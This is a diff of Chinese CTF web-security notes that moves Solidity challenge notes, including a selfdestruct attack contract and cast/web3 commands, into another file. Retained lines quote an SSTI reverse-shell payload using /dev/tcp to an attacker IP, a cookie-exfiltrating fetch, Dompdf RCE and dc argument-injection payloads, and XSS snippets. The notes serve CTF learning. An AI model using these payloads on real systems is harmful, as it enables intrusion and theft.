@@ -4,64 +4,7 @@
 
 此篇笔记对应的gist: https://gist.github.com/Lo4pca/248ed49dea0accfef1527788494e2fa5 。题目对应的关键词将加粗
 
-## Web3
-
-似乎混进来了奇怪的分类……
-
-- [First Drop](https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Web3/first_drop)
-    - 检查一个地址是否是contract不能采用“是否有bytecode”的判断方式。因为合约在构造时（构造函数内）是没有bytecode的
-    - re-entrancty攻击：`_safeMint`与onERC721Received
-- [Pincer](https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Web3/pincer)
-    - sandwich attack (front running + back running)
-- [cr3dao](https://icypetal.github.io/ctf/cr3ctf)
-    - 一道foundry使用例题。也是solidity里DAO概念的示例
-    - [官方wp](https://github.com/cr3mov/cr3ctf-2024/tree/main/challenges/block/cr3dao)更详细。这题的两个漏洞为 https://docs.soliditylang.org/en/latest/security-considerations.html#clearing-mappings 和 https://blog.oxor.io/exploring-the-bugs-and-features-of-solidity-compiler-versions-a-guide-for-smart-contract-fe04e852ea64 。前者是solidity语言的特性：无法删除map。一般将map设为新的空白map看作删除操作，但如果是包含map的数组，使用delete删除数组并创建新数组后数组内部的map保存着删除前的值。后者是solidity 0.8.10之前的漏洞，从calldata或者memory拷贝bytes时，即使数据长度不足32字节也会直接拷贝32字节，导致出现dirty byte。对byte数组调用无参数的`.push()`函数时会泄露这些dirty byte
-- [cr3proxy](https://icypetal.github.io/ctf/cr3ctf/#cr3proxy)
-    - 合约升级（upgrade）和delegate call示例
-- [Bank](https://github.com/NoobMaster9999/My-CTF-Challenges/tree/main/ImaginaryCTF-2024/Misc/bank)
-	- 爆炸了，比赛期间看到uint48有个整数溢出，但是依稀记得solidity里有自动的溢出检查所以没试。结果学艺不精，查了后发现小于0.8.0版本的程序是没有的……
-- [Tree](https://marziano.top/tree.html)
-	- [Merkle Tree](https://dev.to/olanetsoft/merkle-proofs-a-simple-guide-3l02)的[second preimage attack](https://www.rareskills.io/post/merkle-tree-second-preimage-attack)。merkle tree整体呈二叉树状，最下面的叶子（leaf）为保存的数据，其他node为底下两个子node的hash拼接结果。比如：
-	```
-		A
-	   / \
-	  B   C
-	 / \ / \
-	D  E F  G
-	```
-	D,E,F和G为要保存的数据的hash，比如D保存的数据是d，D里存储的就是`H(d)`。接着`H(B)=H(H(D)+H(E))`,C同理。一直这么递推上去，最后root处为`H(A)=H(H(B)+H(C))`。注意leaf存储的数据的长度不能正好是使用的hash函数输出字节的长度的两倍。否则就会出现second preimage attack。攻击者可以把B看成leaf（此时这个“leaf”代表的数据为`H(D)+H(E)`），提供C作为proof，也是一个正确的proof（merkle proof建议看上面提供的链接，有图会比较好理解）。当然，如果leaf不满足这个攻击前提，攻击者就没法把中间node B看成leaf，因为`H(D)+H(E)`的长度不满足合法leaf的数据长度
-- [Play to Earn](https://blog.blockmagnates.com/sekai-ctf-2024-deep-dive-into-the-play-to-earn-blockchain-challenge-a8156be9d44e)
-    - 这题的知识点之前见过：[ChairLift](https://themj0ln1r.github.io/posts/glacierctf23)，主要是erecover无法正确处理address(0)。整个bug我都找出来了，但是不知道为什么remix连不上远程rpc还是什么别的，无法调用函数……这篇wp提供了python web3模块的远程交互代码，下次用这个试试（foundry还是太难配置了，懒）
-    - 使用cast命令行工具的做法： https://7rocky.github.io/en/ctf/other/sekaictf/play-to-earn 。终于找到个记录如何配置的wp，下次试试
-- [zoo](https://blog.soreatu.com/posts/writeup-for-3-blockchain-challs-in-sekaictf-2024)
-    - 这题是个很诡异的东西。虽然是solidity，但是具体原理和pwn差不多……还是放在web3分类下吧
-    - 题目由solidity assembly（基于EVM的栈语言）编写，目标是改动storage中位于slot 1处的issolved变量。整个assembly只有一个opcode可以修改storage里的内容：sstore
-    - 如何查看文件a里b合约的storage布局：`forge inspect a.sol:b storageLayout`
-    - Pausable合约：当`_pause`标志为true时，执行带有whenNotPaused修饰符的函数会被revert
-    - [EVM memory layout](https://docs.soliditylang.org/en/latest/internals/layout_in_memory.html)和[EVM opcodes](https://www.evm.codes/)。注意区分memory和storage。memory是暂时存储空间，存那些无需跨函数调用的数据，比如局部变量，参数和返回值等；storage则是永久存储，存全局变量等。memory按0x20字节（一个slot的大小）对齐，前4 slot `0x00~0x80`被保留。重点是`0x40~0x60`:指向空闲内存。文档里说是“当前已分配内存空间”，等同于说“指向空闲内存的指针”。注意这里只有一个指针，引用时取0x40。`0x40~0x60`准确地说是这个slot的大小。这个指针很重要，汇编里经常引用
-    - 可用`forge inspect a.sol:b deployedBytecode`查看文件a里b合约的字节码。 https://bytegraph.xyz 可以查看汇编的控制流图表，可以在 https://www.evm.codes/playground 调试汇编
-    - 这题的其中一个漏洞是攻击者可以修改函数指针。题目有一个数组，数组里装着一个函数指针a，a指向被whenNotPaused修饰的函数b。假如我们可以修改函数指针，就能将a修改为修饰符逻辑下面的函数b逻辑内容，进而绕过修饰符检查，从而正常执行函数b（相当于修改got表时因为某种原因改成backdoor函数的开头不行，于是就把got修改为backdoor函数的重要部分）。注意solidity里jump的目的地必须是某个jumpdest字节码。剩下的漏洞是内存溢出（有点像堆溢出）和out of bounce read（指程序读取了预期之外的内容）
-    - [预期解](https://blog.solidity.kr/posts/(ctf)-2024-SekaiCTF)里提到了[foundry debugger](https://book.getfoundry.sh/forge/debugger)。感觉和radare2一样都是基于命令行的图形ui调试器
-- [SURVIVE](https://blog.soreatu.com/posts/writeup-for-3-blockchain-challs-in-sekaictf-2024)
-  - ERC-4337 Abstract Account system。相关学习链接：
-    - https://www.alchemy.com/blog/account-abstraction
-    - https://www.alchemy.com/blog/account-abstraction-paymasters
-    - https://www.alchemy.com/blog/account-abstraction-wallet-creation
-  - 此题的漏洞在于，实现Abstract Account system的wrapper时关键正则部分写错了，导致攻击者可以将beneficiary(bundlers)填写为任意地址，进而获取多余的ETH
-- [Arctic Vault](https://writeups.hanz.dev/GCTF24MostBlockchainChallenges.pdf)
-    - delegatecall相关漏洞。去年在GlacierVault见过这个知识点。这题做个补充。delegatecall保留`msg.sender`和`msg.value`的值。所以类似这样的结构是危险的：
-    ```solidity
-    for(uint256 i = 0; i < _data.length; i++)
-    {
-        (bool success, ) = address(this).delegatecall(_data[i]); //设想这里如果调用deposit会发生什么
-    }
-    ```
-    我对这里的`msg.value`的理解是“调用者调用某个函数时附带的eth数“。假如攻击者正常调用两次deposit，就需要付两次eth。但利用上面的for循环+delegatecall，可调用任意次deposit，且只用付一次eth。withdraw的时候就能凭空提取不属于自己的eth
-- [Mafia2](https://github.com/DK27ss/PWNME-CTF-Mafia2-WriteUp)
-    - solidity里的private字段值可以通过`cast storage`获得……并非private
-- [Golden-Bridge](https://eddwastaken.github.io/posts/dicectf-2025-quals-golden-bridge)
-    - 再一次遇到这类用bridge合约串联Ethereum和Solana的资源的题。不过这次感觉对brdige的概念有了更好的认识。因为Ethereum和Solana之间无法通信，故在将a token转成b token（反之亦然）时双方都无法得知对面是否真的有请求数量这么多的token。所以需要在两个之间插入一个双方都信任的中介同时记录双边token的数量
-    - 漏洞在于将sol token转成eth token时，没有确认solana方已完成转账就交付eth token了（solana转账速度较慢）。所以可以获取比实际数量多得多的eth token（某种意义上很像限时的重入攻击？）
+标记`*`的条目原先是web3相关内容，现已移入Web3笔记->Legacy
 
 ## SQL注入
 
@@ -1666,19 +1609,13 @@ $('#ajax-load').load('/ajax/articles?cat=news');
 给img注入了一个属性，但是因为[<noscript>](https://www.runoob.com/tags/tag-noscript.html)标签的存在，无法执行xss。于是根据jQuery[文档](https://api.jquery.com/load/)，利用load函数的提取标签特性成功盗取cookie。
 
 152. flask session密钥爆破工具：[flask-unsign](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/flask#flask-unsign)。例题:[Chocholates](https://eszfrigyes.com/2023/02/ctf-writeup-chocolates-mhsctf2023/)
-153. 智能合约（[solidity](https://docs.soliditylang.org/en/v0.8.17/index.html)语言）初探。例题:[Guess The Name](https://github.com/skabdulhaq/CTF-learnings/blob/main/CTF-writeups/BytesbanditCTF/blockchain-GuessTheName.md)。此题代码很简单，解法是自己写另一个合约，内部根据Challenge合约里已有的接口重写方法，使其返回True；然后连上题目提供的Challenge合约，使用[msg.sender](https://stackoverflow.com/questions/48562483/solidity-basics-what-msg-sender-stands-for)地址[释放](https://www.web3.university/tracks/create-a-smart-contract/deploy-your-first-smart-contract)刚才的写的合约。Challenge合约调用重写的函数，获取flag。
-
-在[ctf wiki](https://ctf-wiki.org/blockchain/ethereum/basics/#txorigin-vs-msgsender)看见了msg.sender的详细解释。msg.sender 是函数的直接调用方，在用户手动调用该函数时是发起交易的账户地址，但也可以是调用该函数的一个智能合约的地址。给定这样一个场景，如用户通过合约 A 调合约 B，此时对于合约 A : msg.sender 是用户；对于合约 B : msg.sender 是合约 A
-
+153. `*`
 154. [Tor](https://zh.wikipedia.org/zh-cn/Tor)可以访问以onion结尾的网站。例题:[Hash Browns](https://medium.com/@vj35.cool/the-bytebandits-ctf-2023-449a2d64c7b4)
 155. onERC721Received回调函数可能触发[Re-Entrancy Attack](https://steemit.com/cn/@chenlocus/reentrancy)（重入攻击，特征为先操作后改状态）+js/python释放合约。例题:[Dragon Slayer](../../CTF/HackTM%20CTF/Web/Dragon%20Slayer.md)。
 156. [zero-trust](https://github.com/5t0n3/ctf-writeups/blob/main/2023-lactf/web/zero-trust/README.md)
 - AES-256-[GCM](https://zh.wikipedia.org/wiki/%E4%BC%BD%E7%BD%97%E7%93%A6/%E8%AE%A1%E6%95%B0%E5%99%A8%E6%A8%A1%E5%BC%8F)(带认证的AES加密)正确使用可防止密文篡改，此题演示了一种错误使用方式：使用decipher.setAuthTag()后却不使用decipher.final()（参考Node.js的[Crypto](https://nodejs.org/api/crypto.html#decipherfinaloutputencoding)模块）。setAuthTag()函数设置一个tag，在最后使用final函数时如果没有提供一样的tag或者密文被篡改，就会报错。
 - AES-256-GCM按128位分块。这题已知部分密文对应的明文，就可以用明文异或密文获取部分加密时的key。此时就能用这小部分key篡改密文了。
-157. [evmvm](../../CTF/LA%20CTF/Web/evmvm.md).
-- EVM虚拟机[opcode](https://www.evm.codes/?fork=merge)
-- solidity [assembly](https://docs.soliditylang.org/en/v0.8.19/assembly.html)内部的语言是[yul](https://docs.soliditylang.org/en/v0.8.17/yul.html)。
-- [GAS](https://zhuanlan.zhihu.com/p/34960267)，[calldata](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/f958b119-5a8d-4050-ad68-6422d10a7655.xhtml)和[function selector](https://solidity-by-example.org/function-selector/)等概念
+157. `*`
 158. [sqlite注入](https://juejin.cn/post/7016991806759911454)。sqlite的语法大部分和sql差不多，不过注释符是`--`,`;`,`/*`。
 159. JWT不仅可以被存储在Cookie里，也可以被存在浏览器的Local Storage里。
 160. [RPS](https://github.com/Dhanush-T/PCTF23-writeups/blob/main/web/RPS/writeup.md)（另一版本[wp](https://sichej.it/writeups/rps-writeup/)）
@@ -2401,85 +2338,8 @@ while true; do curl -i -s -k -X $'POST' \
     --data-binary $'{\"query\":\"mutation { func(param: \\\"value\\\"){id, num} func(param: \\\"value\\\"){id, num} }\"}' \
     $'http://example.com/graphql/console'; done
 ```
-209. [Oh sh. Here we go again ?](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-00--oh-sh-here-we-go-again-)
-- 题目给出contract被deploy的地址后，可以利用[Foundry](https://learnblockchain.cn/docs/foundry/i18n/zh/getting-started/installation.html)命令cast code获取其bytecode。`cast code <contract addr> --rpc-url $RPC_URL`.其中RPC_URL题目会提供。也可以用node js的web3库
-```js
-const Web3 = require('web3');
-const rpcUrl = ''; // Replace with your custom RPC URL
-const web3 = new Web3(rpcUrl);
-
-const contractAddress = ''; // Replace with the address of the contract you want to retrieve bytecode for
-
-web3.eth.getCode(contractAddress, (error, bytecode) => {
-  if (error) {
-    console.error('Error retrieving contract bytecode:', error);
-  } else {
-    console.log('Contract bytecode:', bytecode);
-  }
-});
-```
-获取的bytecode可以[反编译](https://library.dedaub.com/decompile?md5=911ae673dd624b6cf4924a9acdeef8b0)。
-- 调用指定地址的contract的函数。
-  - `cast send <addr> <func,exa:0x3c5269d8> --rpc-url $RPC_URL --private-key $PRIVATE_KEY --legacy`.private_key可以通过在另一个窗口运行anvil获取，不过我运行的时候提示gas超了，把gas改高了又有新问题。
-  - 使用solidity。用remix释放的话需要有metamask，然后选项里的environment选injected provider,连上自己的provider即可（如metamask）。参考：https://avan.sh/posts/hero-ctf-v5/
-```solidity
-contract hero2300_pwn
-{
-    function exploit(address addr) public 
-    {
-        addr.call(abi.encodeWithSelector(0x3c5269d8));
-    }
-}
-```
-- 用python web3和blockchain交互的[课程](https://www.youtube.com/watch?v=UBK2BoFv6Lo&list=PLCwnLq3tOElrubfUWHa1qKrJv1apO8Aag)
-210. [Classic one tbh](https://github.com/m4k2/HeroCTF-V5-WU-Foundry/tree/main#challenge-01--classic-one-tbh)
-- [selfdestruct](https://solidity-by-example.org/hacks/self-destruct/)漏洞。特征点：合约判断balance的逻辑依赖于`address(this).balance`。该函数会将一个合约从blockchain上删除，并将合约内剩余的全部ether转账到制定地址。可用于给没有实现接收转账功能的合约强行转账。
-```
-The selfdestruct function in Solidity is used to delete a contract from the blockchain and transfer any remaining ether stored in the contract to a specified address.
-
-The selfdestruct function is a built-in function in Solidity that can be called from a contract to delete itself and transfer its remaining ether balance to a specified address.
-
-The selfdestruct function can also be used maliciously to force ether to be sent to a specific target by creating a contract with a selfdestruct function, sending ether to it, and calling selfdestruct(target).
-
-There are three ways to transfer ether in Solidity: transfer, send, and call.value().gas. Each of these ways requires the target to receive the funds to transfer them to the correct address. However, the selfdestruct function can transfer funds without obtaining the funds first.
-
-To prevent vulnerabilities caused by the selfdestruct function, developers can use a local state variable to update the current balance of the contract when the user deposits funds, instead of using address(this).balance.
-```
-攻击合约例子：
-```solidity
-pragma solidity 0.8.17;
-
-contract Selfdestruct{
-    constructor() payable{
-        require(msg.value == 0.5 ether);
-    }
-
-    function kill(address addr) public {
-        selfdestruct(payable(addr));
-    }
-}
-```
-foundry释放/调用相关命令：
-```
-forge create selfdestruct.sol:Selfdestruct --value 0.5ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
-cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL --private-key $PRIVATE_KEY
-```
-攻击原理：攻击合约实现了selfdestruct，kill函数的addr填题目的address。这样执行攻击合约的kill函数就会把攻击合约全部的ether转给题目合约。由于题目合约依赖`address(this).balance`计算自身balance，但又有局部变量计算应该有的balance：
-```solidity
-    function sell(uint256 _amount) external {
-        require(userBalances[msg.sender] >= _amount, "Insufficient balance");
-
-        userBalances[msg.sender] -= _amount;
-        totalSupply -= _amount;
-
-        (bool success, ) = msg.sender.call{value: _amount * TOKEN_PRICE}("");
-        require(success, "Failed to send Ether");
-        //getEtherBalance()内部使用address(this).balance
-        assert(getEtherBalance() == totalSupply * TOKEN_PRICE);
-    }
-```
-那么assert永远不会通过。
-
+209. `*`
+210. `*`
 211. [Drink from my Flask #1](https://github.com/HeroCTF/HeroCTF_v5/tree/main/Web/Drink_from_my_Flask_1)
 - python flask ssti+key爆破、session伪造
     - 反弹shell payload：`{{ cycler.__init__.__globals__.os.popen('bash -c \"bash -i >& /dev/tcp/172.17.0.1/9999 0>&1\"').read() }}`,172.17.0.1换为攻击机器外网ip
@@ -3063,24 +2923,7 @@ js.fetch("url" + js.document.cookie)
         r.close()
     send_mail('', input("address: ").strip())
     ```
-244. [gambling](https://github.com/Kaiziron/gpnctf2023-writeup/blob/main/gambling.md)
-- blockchain solidity [frontrunning](https://omniatech.io/pages/decoding-frontrunning-understanding-the-key-terms-and-techniques/)例题。想快速了解这种技巧可以看[视频](https://www.youtube.com/watch?v=uElOqz-Htos).个人认为frontrunning打的是信息差。一个简单的案例：假设有A和攻击者B，以及货币C，价格为1。A尝试购买C货币时被B提前得知，于是B尝试在A之前购买C货币（支付更高的gas fee从而先处理B的请求）。那么到A购买的时候，C货币的价格就涨了，比如涨到1.2。等A买完，B再卖掉，净赚1.2-1的货币差值。
-- [VRF Security Considerations](https://docs.chain.link/vrf/v2/security)(Verifiable Random Function)：Don't accept bids/bets/inputs after you have made a randomness request。此题正是违反了这条导致frontrunning。接着上一条，其实frontrunning不一定要两个人，它只是“提前知道某个信息并获利”的手段。现在有个这样逻辑的合约A：
-	- enter(num)函数：输入一个num数字，同时合约A向随机数合约B发送随机数请求
-	- 合约B返回随机数
-	- claim函数：判断num是否与合约B返回的随机数相同
-
-漏洞点在于，在发送随机数请求和返回随机数的中间，没有限制用户不能再调用enter函数。加上合约运行时的一举一动是可以在mempool里看到的，并且任何人都能从RPC provider（如[quicknode](https://www.quicknode.com/)）那里获取到mempool内容，便有了frontrunning。我们可以随便enter一个数字，在合约B返回随机数之前，提前从mempool读取到这个随机数，然后使用更高的gas fee再次enter这个正确的随机数，让oracle先处理我们这个请求。最后在第二次随机数返回前，调用claim，完成攻击。
-- 一些python web3脚本编写的基础知识。
-```py
-from web3 import Web3, HTTPProvider
-web3 = Web3(HTTPProvider('<rpc url>'))
-gambling_abi = #https://www.quicknode.com/guides/ethereum-development/smart-contracts/what-is-an-abi 。可在Remix里compile合约后获得
-gambling_contract = web3.eth.contract(address='', abi=gambling_abi)
-#wp里还包含：如何转账（transaction）
-#如何从RPC provider那里获取mempool内容
-#cast命令调用合约函数
-```
+244. `*`
 245. [Stickers](https://github.com/daffainfo/ctf-writeup/tree/main/NahamCon%20CTF%202023/Stickers)
 - CVE-2022-28368 - [Dompdf RCE利用](https://www.optiv.com/insights/source-zero/blog/exploiting-rce-vulnerability-dompdf)。使用工具： https://github.com/rvizx/CVE-2022-28368/tree/main 。`python3 dompdf-rce.py --inject "将html转为pdf的url" --dompdf "http://vuln/dompdf/"`。该payload可以反弹shell。
 	- `Unable to stream pdf:headers already sent`为dompdf的错误提示。还有另一种方法判断：由dompdf生成出来的pdf的exif Producer字段会写dompdf的版本。
@@ -3189,21 +3032,9 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 - linux dc命令参数注入导致的rce。`-e`选项可以执行一个表达式，但当表达式中出现`!`时，会将剩余的语句当作系统命令执行。
     - `-e"!cat$IFS*.txt%0A`：第一个`"`用于分割命令（这种情况下不是必须的，详情见文档。本来标准是用空格的，这里绕过滤），`$IFS`表示空格也是绕过滤，`%0A`表示换行，不换行命令是不会执行的
     - `-e!cat${IFS}fl*;#`
-261. [Positive](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-1--positive),题目源码（包括下面的Infinite和Deception）： https://github.com/Kaiziron/crewctf2023-writeup/
-- solidity中也有整形溢出
-- cast call和cast send的区分及使用
-    - `cast call` is used to perform a call on an account without publishing a transaction. Use `cast call` when you want to retrieve data from the blockchain or execute a function on a smart contract without making any changes to the blockchain state. This is useful for querying information or performing read-only operations. The `cast call` command requires the account address, the function name or signature to call, and the RPC URL of the blockchain network
-    - `cast send` is used to send arbitrary messages or transactions between accounts. Use `cast send` when you want to send transactions or messages that will modify the blockchain state. This is useful for executing functions that have side effects, such as updating contract variables or transferring tokens. The `cast send` command requires the private key of the sender account, the recipient account address, and the message or transaction data
-262. [Infinite](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-2-infinite)
-- [ERC-20 token](https://ethereum.org/en/developers/docs/standards/tokens/erc-20/)使用案例
-    - approve(spender addr,amount)：允许addr处的contract使用amount这么多的token（所有者使用该函数后其他contract才能使用transferFrom将最多amount的token从所有者那里转走）
-    - allowance(spender,this)：返回spender（token所有者）允许被转走的token数量
-    - balanceOf(addr):返回addr拥有的token数量
-- 使用forge释放contract:`forge create file.sol:<contract_name> --private-key <private_key> --rpc-url <rpc_url>`
-263. [Deception](https://sh4dy.com/posts/crewCTF-web3-Writeups/#challenge-3-deception)
-- 利用cast code获取指定地址处的contract的bytecode
-- 使用cast storage分析指定地址处的contract的storage layout：`cast storage <contract_addr> <storage_slot_num> --rpc-url <rpc_url>`
-- 使用cast send调用含参数的函数
+261. `*`
+262. `*`
+263. `*`
 264. [Safe Proxy](https://untrue.me/writeups/crewctf2023/safe-proxy/)
 - [deno](https://github.com/denoland/deno)(A modern runtime for JavaScript and TypeScript)允许fetch函数的参数为`file://`，即可以通过fetch获取本地文件。
 - `$DENO_DIR`默认为`$HOME/.deno`
@@ -3460,19 +3291,15 @@ my.onload = function () {
 292. [Cybergon's Blog](https://learn-cyber.net/writeup/Cybergon's-Blog)
 - php session文件包含rce。php session文件通常在默认目录下，且文件的内容用户一般可控制（如记录了username）。如果有文件包含漏洞，将代码放进session文件里再包含即可触发rce
 - 有时候session可能不在默认目录下。这种情况尝试`/proc/self/fd/[num]`，有概率访问到session文件
-293. [Re-Remix](https://github.com/minaminao/ctf-blockchain/tree/main/src/ProjectSekaiCTF2023)
-- solidity [Read-only reentrancy](https://medium.com/@zokyo.io/read-only-reentrancy-attacks-understanding-the-threat-to-your-smart-contracts-99444c0a7334)攻击。算reentrancy下的一个小分支，利用错误的逻辑导致程序读取一些重要的值时出错。这种攻击一般都出现在不遵守[Checks, Effects, Interactions](https://blockchain-academy.hs-mittweida.de/courses/solidity-coding-beginners-to-intermediate/lessons/solidity-11-coding-patterns/topic/checks-effects-interactions/)的代码中。Checks, Effects, Interactions指的是代码需要先检查，再更改状态，最后与用户交互。一个例子就是取钱逻辑，首先要判断用户是否有那么多的钱，然后在帐户上扣除相应的钱，最后再调用用户的诸如`payable(msg.sender).call`函数。如果反过来，检查后先与用户交互，再扣除钱，那么用户可以在call函数内再来一次取钱。因为状态未更新，凭空就多出来了双倍的钱
-- 简述一下这道题的Read-only reentrancy。在getGlobalInfo函数中，d和_totalVolumeGain的值正常情况下是一样的，`(d * 10 ** DECIMALS) / _totalVolumeGain`最终结果是`10 ** DECIMALS`，1后面跟着很多0。我们的目标是让这个结果包含更多数字（不只是1和0）。increaseVolume和decreaseVolume可以修改_totalVolumeGain，但是正常调用的话d的值也会改，效果就是_totalVolumeGain继续等于d。关键点在于decreaseVolume中有句`payable(msg.sender).sendValue(amount);`,此时其中一个值改了但另一个值没改（就是上面提到的Effects, Interactions反了）。那么就能在攻击合约的`receive()`函数中调用finish间接调用getGlobalInfo，利用d和_totalVolumeGain值不一样的时机完成攻击
-- 这题的代码似乎从 https://chainsecurity.com/curve-lp-oracle-manipulation-post-mortem/ 更改而来
-294. [Play for Free](https://mcfx.us/posts/2023-09-01-sekaictf-2023-writeup/#blockchain-play-for-free)
-- Solang contract blockchain题目。目标是读取合约的private storage并与其交互。a Solang contract saves data in another data account/search value in dispatch table
+293. `*`
+294. `*`
 295. [Scanner Service](https://learn-cyber.net/writeup/Scanner-Service)
 - ruby的`to_i`函数将字符串转为数字，但是只要字符串以数字开头即可。如`"123abc".to_i`结果为123，不会报错
-- nmap参数注入。如果没法注入新的命令，单纯靠nmap的参数也可以rce。参考 https://gtfobins.github.io/gtfobins/nmap/ 和wp（需要公网ip,如果用ngrok转发的话注意过滤，需要把域名转成ip： https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service/ ）
+- nmap参数注入。如果没法注入新的命令，单纯靠nmap的参数也可以rce。参考 https://gtfobins.github.io/gtfobins/nmap/ 和wp（需要公网ip,如果用ngrok转发的话注意过滤，需要把域名转成ip： https://siunam321.github.io/ctf/SekaiCTF-2023/Web/Scanner-Service ）
 - shell命令参数除了用`${IFS}`和空格隔开，还能用tab键
-296. [Golf Jail](https://blog.antoniusblock.net/posts/golfjail/)
+296. [Golf Jail](https://blog.antoniusblock.net/posts/golfjail)
 - iframe的srcdoc里的内容光用php的`htmlspecialchars`是不够的，因为srcdoc里的代码本身就能适配HTML entities（其他语言的sanitize函数同理，见[Refined Notes](https://github.com/0xM4hm0ud/CTF-Writeups/tree/main/GPN%20CTF%202024/Web/Refined%20Notes) ）。iframe里的csp遵循其parent的csp
-- 构造较短的js xss payload。参考 https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail/ ，一般有3种做法：
+- 构造较短的js xss payload。参考 https://www.offensiveweb.com/docs/writeup/sekaictf2023_golfjail ，一般有3种做法：
 ```html
 <!-- <svg/onload=xxx 也可以 -->
 <svg onload=eval(location)> <!-- about:srcdoc（如果在iframe里，这个不能用）-->
@@ -3543,36 +3370,7 @@ wp里还有将要泄露的内容转换为符合域名规范的16进制的进阶p
 303. [Static File Server](https://xhacka.github.io/posts/writeup/2023/09/03/static-file-server/)
 - 有时候浏览器会标准化url，让路径穿越的payload`../`无法使用。此时可以用curl加上`--path-as-is`选项访问
 - Python的aiohttp asynchronous HTTP Client/Server中`web.static('/files', './files', follow_symlinks=True)`无法防止/files处的路径穿越
-304. [Eight Five Four Five](https://www.youtube.com/watch?v=1FxjP_hwqec)
-- 使用python web3与solidity blockchain进行基础交互：连接，调用函数。题目一般会给出以下值：
-    - player wallet address
-    - private key
-    - contract address:题目合约所在的地址
-    - rpc url
-    - abi：也可以从题目给出的源码那里自行编译获取
-    - initial gas price
-```py
-from web3 import Web3
-web3=Web3(Web3.HTTPProvider(rpc_url))
-contract=web3.eth.contract(address=contract_address,abi=abi)
-#contract.functions为全部可调用的函数
-contract.functions.function_name().call() #调用名为function_name的函数。注意这种调用方式只能调用那些仅从blockchain读取数据的函数（例如单纯return某个值），无法调用会改变合约状态的函数（例如函数内部会给一个属性赋值）。调用这类函数参考下面：
-#有些POA chain在build之前需要middleware，否则会引发ExtraDataLengthError
-from web3.middleware import geth_poa_middleware
-web3.middleware_onion.inject(geth_poa_middleware,layer=0)
-#get nonce
-nonce=web3.eth.get_transaction_count(caller)
-#build transaction
-trx=contract.functions.function_name().build_transaction({'from':player_wallet_address,'nonce':nonce,'gasPrice':initial_gas_price})
-#用私钥签名transaction
-strx=web3.eth.account.sign_transaction(trx,private_key=private_key)
-hstrx=web3.eth.send_raw_transaction(strx.rawTransaction)
-#当status为1时表示处理成功
-res=web3.eth.wait_for_transaction_receipt(hstrx)
-```
-- 文字版的wp： https://justinapplegate.me/2023/ductf-8545/ ，连接的方法是一样的，不过多了个怎么用remix找合约的abi
-- remix解法： https://bsempir0x65.github.io/CTF_Writeups/DownUnderCTF_2023
-- cast命令解法： https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/blockchain/eightfivefourfive/solve
+304. `*`
 305. [strapi in](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/strapi-in)
 - [strapi-plugin-email-designer](https://github.com/alexzaganelli/strapi-plugin-email-designer) ssti
 306. [0day blog](https://github.com/DownUnderCTF/Challenges_2023_Public/tree/main/web/0day-blog)
@@ -3591,8 +3389,7 @@ res=web3.eth.wait_for_transaction_receipt(hstrx)
 - python建立websocket连接+计算图片阴影部分面积。websocket连接的网页用requests是连不上的
 - 不知道为啥，在做[kaboot](https://github.com/TJCSec/tjctf-2024-challenges/tree/main/web/kaboot)时websocket库出问题了，没法send（奇了怪了，明明官方也是用这个库的）。于是这里是nodejs做法：**kaboot**
 - 好好好，今天又遇见一道websocket题，python和nodejs都不行，疯狂断连。但为啥别人的nodejs就行啊？[Spinner](https://vaktibabat.github.io/posts/vsCTF_Writeups/),以及个人的无脑console解法（用js代码触发题目自带的event从而发送socket信息）和其他python解法： **spinner**
-312. [ZKPLite](https://github.com/sahuang/my-ctf-challenges/tree/main/vsctf-2023/misc_zkplite)
-- blockchain如何计算/预测合约地址（msg.sender）： https://docs.soliditylang.org/en/latest/control-structures.html#salted-contract-creations-create2
+312. `*`
 313. [Optimized Admin Bot](https://www.youtube.com/watch?v=BRnMRdQJVeo)
 - JSDOM在服务器的node context下执行代码，所以获取xss时可以利用spawn等函数直接RCE。当`runScripts`设置为`dangerously`时，有一个小小的沙盒用于执行代码，可以参考wp的做法逃逸： https://gist.github.com/c0nrad/b919aa1c659a4d0f9596f5c6e1aad47f
 - [其他做法](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#optimized-admin-bot)包含技巧：
@@ -3692,31 +3489,15 @@ user.Name := "😃" // Contains 1 emoji character
 lengthOfString := len(user.Name)            // Length of the string (bytes) - 4 (UTF-8 encoding)。直接求unicode字符的长度是4
 lengthOfRuneSlice := len([]rune(user.Name)) // Length of rune slice (code points) - 1。转成go里特有的处理unicode的rune后长度就是1
 ```
-343. [Venue](https://chovid99.github.io/posts/tcp1p-ctf-2023/#venue)
-- solidity blockchain的EVM里有两种与合约交互的形式：
-    - call：A read-only operation that executes a contract function locally without altering the blockchain state. It’s used to query or test functions and doesn’t require gas since it doesn’t create a transaction on the blockchain
-    - transaction：A write operation that alters the blockchain state (such as updating variables, transferring ETH, or contract deployment). It requires gas and confirmation by the network, and the changes are permanently recorded on the blockchain
-
-长话短说，call用来调用那些不会改变合约自身状态的函数（只读）；transaction则与之相反。用foundry call函数时不需要private key，而transaction需要
-
-344. [Location](https://chovid99.github.io/posts/tcp1p-ctf-2023/#location)
-- solidity blockchain EVM slot。EVM中的每个合约都有persistent storage。每个合约中的字段都会按顺序放到storage slots里，直到当前slot已满（一个slot 32字节）。有些被标记immutable的字段除外，它们不被存储在任何slot里。可以用solc命令查看详细的storage slots信息：`solc test.sol --storage-layout`。也可以用remix查看slot。在remix里编译合约后查看STORAGELAYOUT（跟ABI在一样的地方）即可
-345. [VIP](https://chovid99.github.io/posts/tcp1p-ctf-2023/#vip)
-- 如何安装MetaMask并获取private key。在执行合约的transaction时必须有自己的wallet和私钥
-- foundry 与合约进行交互：call/transaction。foundry使用补充： https://themj0ln1r.github.io/posts/tcp1pctf
-346. [Invitation](https://chovid99.github.io/posts/tcp1p-ctf-2023/#invitation)
